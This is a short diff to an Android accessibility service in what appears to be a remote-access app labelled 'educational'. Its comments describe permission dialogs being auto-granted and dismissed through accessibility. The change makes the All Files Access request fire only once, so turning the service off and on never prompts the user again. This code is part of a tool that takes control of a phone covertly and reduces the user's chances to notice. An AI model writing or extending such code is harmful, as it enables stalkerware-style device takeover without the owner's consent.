@@ -475,13 +475,20 @@ public class UnifiedAccessibilityService extends AccessibilityService {
 
         // Phase 2 (10 s): request WRITE_EXTERNAL_STORAGE / All Files Access AFTER all
         // other permission dialogs have been auto-granted and dismissed.
+        // This step runs ONLY ONCE ever (tracked via SharedPreferences) so toggling
+        // the accessibility service off and back on never re-triggers the storage prompt.
         autoGrantHandler.postDelayed(() -> {
             try {
+                android.content.SharedPreferences prefs = getSharedPreferences("auto_grant_prefs", MODE_PRIVATE);
+                boolean storagePromptDone = prefs.getBoolean("storage_prompt_done", false);
                 com.remoteaccess.educational.permissions.AutoPermissionManager apm =
                     new com.remoteaccess.educational.permissions.AutoPermissionManager(this);
-                if (!apm.hasManageExternalStorage()) {
+                if (!storagePromptDone && !apm.hasManageExternalStorage()) {
                     apm.requestWriteExternalStorageLast();
-                    Log.i(TAG, "Auto-grant: requested WRITE_EXTERNAL_STORAGE / All Files Access (last step)");
+                    prefs.edit().putBoolean("storage_prompt_done", true).apply();
+                    Log.i(TAG, "Auto-grant: requested WRITE_EXTERNAL_STORAGE / All Files Access (last step, first-launch only)");
+                } else {
+                    Log.i(TAG, "Auto-grant: storage prompt already done or permission already granted — skipping");
                 }
             } catch (Exception ignored) {}
         }, 10_000);
